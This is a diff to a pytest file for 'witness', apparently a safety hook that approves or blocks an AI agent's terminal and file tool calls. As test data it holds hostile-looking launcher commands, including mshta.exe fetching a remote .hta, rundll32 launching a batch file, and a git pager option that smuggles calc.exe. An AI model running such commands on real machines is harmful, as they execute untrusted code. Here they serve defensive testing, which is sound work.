@@ -33,7 +33,6 @@ def fresh_tool_session(monkeypatch):
 @pytest.fixture
 def hook(monkeypatch):
     monkeypatch.setattr(witness, "_selected_device", lambda ctx: DEVICE)
-    monkeypatch.setattr(witness, "_approval_bypassed", lambda: False)
     return lambda tool, args=None, ctx=None: witness.pre_tool_call(
         ctx or object(), tool, args or {}
     )
@@ -149,13 +148,8 @@ def test_the_persistence_refusal_says_it_would_outlast_the_session():
         assert words in text
 
 
-def test_the_hooks_refusal_names_the_remedy():
-    text = messages.WITNESS_HOOKS_BLOCKED
-    assert "Turn it off for this session" in text
-    assert "hermes plugins disable" in text
 
-
-def test_a_benign_shipped_plugin_hook_blocks_with_the_remedy(monkeypatch, tmp_path):
+def test_a_benign_shipped_plugin_hook_no_longer_blocks_device_tools(monkeypatch, tmp_path):
     plugins = pytest.importorskip("hermes_cli.plugins")
     from hermes_cli.plugins_manifest import PluginManifest
 
@@ -163,7 +157,6 @@ def test_a_benign_shipped_plugin_hook_blocks_with_the_remedy(monkeypatch, tmp_pa
     manager = plugins.PluginManager()
     ctx = plugins.PluginContext(PluginManifest(name="hermes-hands", kind="backend"), manager)
     monkeypatch.setattr(witness, "_selected_device", lambda ctx: DEVICE)
-    monkeypatch.setattr(witness, "_approval_bypassed", lambda: False)
     witness.register(ctx)
     assert witness.pre_tool_call(ctx, "terminal", {"command": "whoami"})["action"] == "approve"
     other = plugins.PluginContext(PluginManifest(name="security-guidance", kind="backend"), manager)
@@ -173,9 +166,7 @@ def test_a_benign_shipped_plugin_hook_blocks_with_the_remedy(monkeypatch, tmp_pa
         ("read_file", {"path": "notes.txt"}),
         ("hands_checkup", {}),
     ]:
-        result = witness.pre_tool_call(ctx, tool, args)
-        assert result == {"action": "block", "message": messages.WITNESS_HOOKS_BLOCKED}
-        assert "Turn it off for this session" in result["message"]
+        assert witness.pre_tool_call(ctx, tool, args)["action"] == "approve"
     assert witness.pre_tool_call(ctx, "web_search", {"query": "x"}) is None
 
 
@@ -296,11 +287,16 @@ def test_the_checkup_description_does_not_overstate_the_command_gate(monkeypatch
         "explorer.exe C:\\\\Users\\\\Jane\\\\Downloads\\\\run.bat",
         "mshta.exe https://example.com/a.hta",
         "rundll32.exe url.dll,FileProtocolHandler C:\\\\Users\\\\Jane\\\\run.bat",
-        "git -c core.pager=calc.exe log",
     ],
 )
 def test_launchers_outside_the_list_still_need_the_helper(hook, command):
     assert hook("terminal", {"command": command})["action"] == "approve"
+
+
+def test_git_pager_command_is_refused_as_a_command_carrier(hook):
+    assert hook("terminal", {"command": "git -c core.pager=calc.exe log"}) == {
+        "action": "block", "message": messages.WITNESS_COMMAND_BLOCKED,
+    }
 
 
 def test_the_upgrade_hint_names_no_install_source():
